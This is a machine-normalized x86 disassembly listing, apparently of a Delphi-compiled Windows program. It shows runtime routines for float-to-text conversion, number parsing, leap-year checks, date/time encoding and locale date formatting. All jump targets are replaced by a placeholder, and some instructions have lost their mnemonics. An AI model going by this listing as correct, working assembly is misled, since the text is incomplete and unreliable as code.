mov eax [ ebp - 0x4 ]
call sub_404114
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404114
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4087e8
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403f44
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403e54
mov eax esi
mov edx ebx
call sub_4044a0
mov eax [ ebp - 0x4 ]
call sub_404114
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4087e8
mov edx esi
xchg edx eax
call sub_4044a0
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408cb4
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408cf8
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408fcc
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408df7
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408e01
call sub_408df7
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408cb4
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408e5d
call sub_408df7
call sub_408dee
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408dee
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408cb4
retn
xor ecx ecx
sub_408e99
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408dee
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408dee
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408efe
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408f52
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408e99
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408fcc
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408ff9
jmp r-xdata
call sub_40911b
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408ff9
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c58
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40911b
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4091f8
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4092af
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4092ba
neg edx
mov ecx esi
call sub_4092ba
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4092af
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4092d6
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c58
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4092ba
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4092d6
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40930c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408cf8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f44
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40933c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408cf8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f44
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409388
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404314
mov edx esp
xor ecx ecx
call sub_4091f8
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4093b4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404314
mov edx esp
xor ecx ecx
call sub_4091f8
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4093fc
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409440
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4094b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409440
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407968
sub_4094f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4093fc
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_40794c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_40794c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_40794c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40954c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409588
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40954c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409650
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409588
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407968
sub_409680
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4093fc
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_40794c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_40794c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_40794c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40954c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_4097cc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409680
pop esi
pop ecx
pop ebp
retn 0x8
sub_4097ec
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4093fc
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409814
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409650
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_4094b0
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409878
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_4098bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404114
mov edx eax
mov eax ebx
call sub_409878
pop ecx
pop ebx
pop ebp
retn
sub_4098dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4087e8
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409878
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409928
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409954
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_4097cc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40998c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4094f0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_4099cc
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409b1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e54
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403eec
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409b21
lea eax [ ebp - 0x118 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4040c4
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404114
mov edx eax
mov eax [ ebx ]
call sub_40bf10
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c084
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404374
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c020
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_40404c
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c084
mov ecx eax
mov eax ebx
mov edx esi
call sub_403f44
sub_409b34
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409c12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e54
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403eec
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403eec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409c19
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4040c4
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404114
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404374
sub_409c3c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a3bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a3c4
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403e78
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c104
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c0e4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409878
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c104
mov [ ebp - 0x4 ] eax
